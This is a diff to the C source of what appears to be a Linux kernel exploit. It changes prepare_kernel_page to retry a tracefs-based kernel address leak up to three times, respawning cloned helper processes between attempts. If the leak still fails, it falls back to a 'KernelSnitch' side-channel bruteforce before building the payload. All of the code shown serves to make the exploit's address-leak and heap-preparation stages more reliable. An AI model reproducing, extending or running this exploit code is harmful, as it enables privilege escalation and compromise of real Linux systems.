@@ -2145,22 +2145,51 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     tracefs_mm_baseline();
   }
 #endif
-  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
-    pre_ctx.childs[i] = clone_child();
-  }
 #if defined(APP_TRACEFS_MM_LEAK) && APP_TRACEFS_MM_LEAK
-  if (trace_window) {
-    child_leak = tracefs_mm_clone_hold();
-  } else
-#endif
-  {
-    child_leak = clone_leak_child();
-  }
-  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
-    post_ctx.childs[i] = clone_child();
-  }
-#if defined(APP_TRACEFS_MM_LEAK) && APP_TRACEFS_MM_LEAK
-  if (trace_window) {
+  /*
+   * A tracefs miss costs a few hundred milliseconds, a KernelSnitch fallback
+   * tens of seconds, so refresh the window before paying for a bruteforce.
+   */
+  const int mm_trace_attempts = trace_window ? 3 : 1;
+  int trace_attempted = 0;
+  for (int mm_trace_attempt = 0; mm_trace_attempt < mm_trace_attempts;
+       mm_trace_attempt++) {
+    if (mm_trace_attempt) {
+      for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+        kill_child(pre_ctx.childs[i]);
+        pre_ctx.childs[i] = -1;
+      }
+      for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
+        kill_child(post_ctx.childs[i]);
+        post_ctx.childs[i] = -1;
+      }
+      if (child_leak > 0) {
+        tracefs_mm_release_child();
+        SYSCHK(waitpid(child_leak, NULL, 0));
+        child_leak = -1;
+      }
+      if (!tracefs_mm_start()) {
+        trace_window = 0;
+        break;
+      }
+    }
+    if (trace_window) {
+      tracefs_mm_baseline();
+    }
+    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+      pre_ctx.childs[i] = clone_child();
+    }
+    if (trace_window) {
+      child_leak = tracefs_mm_clone_hold();
+    } else {
+      child_leak = clone_leak_child();
+    }
+    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
+      post_ctx.childs[i] = clone_child();
+    }
+    if (!trace_window) {
+      break;
+    }
     size_t mm_min_index = APP_SLIDE_MIN_OBJECT_INDEX;
     size_t mm_max_index = APP_SLIDE_MAX_OBJECT_INDEX;
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && defined(APP_FOPS_MIN_OBJECT_INDEX)
@@ -2173,20 +2202,34 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
     }
 #endif
+    trace_attempted = 1;
     if (tracefs_mm_finish(&leaked, pre_ctx.mm_cnt, mm_min_index,
                           mm_max_index)) {
       mm_leaked_ready = 1;
-      pr_success("mm trace leak leaked=%016zx\n", leaked);
-    } else {
-      if (child_leak > 0) {
-        tracefs_mm_release_child();
-        SYSCHK(waitpid(child_leak, NULL, 0));
-      }
-      child_leak = -1;
-      pr_info("mm trace leak missing; using KernelSnitch\n");
-      setup_kernel_page_kernelsnitch(payload_mode, cpu_count);
-      child_leak = clone_leak_child();
+      pr_success("mm trace leak leaked=%016zx attempt=%d/%d\n", leaked,
+                 mm_trace_attempt + 1, mm_trace_attempts);
+      break;
     }
+    pr_info("mm trace leak missing attempt=%d/%d\n", mm_trace_attempt + 1,
+            mm_trace_attempts);
+  }
+  if (!mm_leaked_ready && trace_attempted) {
+    if (child_leak > 0) {
+      tracefs_mm_release_child();
+      SYSCHK(waitpid(child_leak, NULL, 0));
+      child_leak = -1;
+    }
+    pr_info("mm trace leak unavailable; using KernelSnitch\n");
+    setup_kernel_page_kernelsnitch(payload_mode, cpu_count);
+    child_leak = clone_leak_child();
+  }
+#else
+  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+    pre_ctx.childs[i] = clone_child();
+  }
+  child_leak = clone_leak_child();
+  for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
+    post_ctx.childs[i] = clone_child();
   }
 #endif
 
